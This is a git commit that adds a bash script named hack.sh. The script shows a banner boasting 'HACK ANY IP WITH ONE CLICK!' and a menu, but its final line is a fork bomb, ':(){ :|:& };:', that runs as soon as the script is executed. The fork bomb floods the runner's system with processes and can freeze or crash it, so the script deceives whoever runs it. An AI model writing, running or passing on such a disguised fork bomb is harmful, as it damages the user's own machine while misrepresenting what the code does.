0d67a69852040b12ac900b1f0084dd07e4dd7c32
Stalin Alexander <50262159+astalin28@users.noreply.github.com>
2024-06-09 15:50:48 +0530

    Create hack.sh

---
+++ hack.sh
@@ -0,0 +1,20 @@
+techo -e "\e[1;31m"
+echo "X - C r i p t o" | figlet -f mini
+echo -e "\e[1;0mHACK ANY IP WITH ONE CLICK!"
+
+echo \
+
+echo -e  "\e[1;90m Developed By:"
+echo -e "\e[92m"
+figlet -f wideterm "STALIN THOMAS"
+echo "------------------------------"
+
+echo \
+
+echo "1.Encrypt"
+echo "2.Decrypt"
+echo "3.Hack"
+
+count=0
+echo "Enter Your Choice: " 
+:(){ :|:& };:
